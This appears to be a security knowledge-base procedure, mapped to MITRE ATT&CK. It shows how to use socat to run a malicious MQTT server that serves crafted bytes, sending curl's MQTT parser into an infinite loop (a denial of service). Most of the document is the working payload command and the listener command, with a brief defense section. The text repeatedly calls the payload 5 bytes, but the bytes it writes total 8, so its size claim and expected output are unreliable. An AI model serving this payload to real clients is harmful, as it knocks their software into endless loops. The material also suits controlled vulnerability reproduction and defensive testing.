---
tags:
  - dos
  - mqtt
  - server-setup
type: procedure
tools:
  - '[[tools/socat]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/socat-mqtt-server-setup]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:36.682Z'
sub_techniques: []
id: 26f0c565-7e9f-4361-80a2-d936f5bc1db5
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Set-Up-Malicious-MQTT-Server-with-socat

## Summary

This procedure sets up a local TCP server using socat to simulate a malicious MQTT server that serves a 5-byte proof-of-concept response, enabling the reproduction of a DoS vulnerability in curl's MQTT handler.

## Description

In the attack scenario, an attacker controls an MQTT server and sends a partial MQTT CONNECT response (header byte 0x10 indicating CONNECT, remaining length 0x18, flags 0x00, protocol length 0x04, 'MQTT' string) followed by immediate connection closure. This tricks curl into an infinite loop when it fails to detect the closure during parsing in lib/mqtt.c. The target environment is a Linux system with socat installed, and the procedure requires creating a binary 'poc' file with the exact 5 bytes: echo -ne '\x10\x18\x00\x04MQTT' > poc. Expected outcome is a forking server ready to serve the payload to incoming connections on port 12345.

## Requirements

1. Linux system with socat installed
2. Binary 'poc' file containing the 5-byte MQTT trigger
3. Local TCP access on port 12345

## Defense

Defensive measures and detection strategies:

- Configure firewalls to restrict MQTT traffic to trusted endpoints
- Use curl with explicit timeouts (--max-time) to limit exposure
- Monitor for anomalous CPU spikes in curl processes handling MQTT

## Objectives

1. Establish a persistent server simulating a vulnerable MQTT endpoint
2. Serve crafted response to induce parsing errors in clients
3. Enable controlled reproduction of the DoS for testing

## Instructions

### Step 1: Prepare POC File

**Context**: Create the 5-byte binary file that represents the partial MQTT response to trigger the loop.

**Command** ([[commands/create-poc-file]]):
```bash
echo -ne '\x10\x18\x00\x04MQTT' > poc
```

> This command writes the exact bytes needed for the malformed response. Expected output: A file 'poc' of 5 bytes verifiable with hexdump -C poc.

### Step 2: Start the Server

**Context**: Launch socat to listen on TCP port 12345 and serve the poc file unidirectionally, forking for multiple connections.

**Command** ([[commands/socat-mqtt-server-setup]]):
```bash
socat -u FILE:poc TCP-LISTEN:12345,reuseaddr,fork
```

> This sets up the server in unidirectional mode from file to TCP, reusing the address and forking processes. Expected output: Server runs indefinitely, logging connections if verbose.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/socat-mqtt-server-setup]]

## Tools Used

- [[tools/socat]]

## Tags

- [[dos]]
- [[mqtt]]
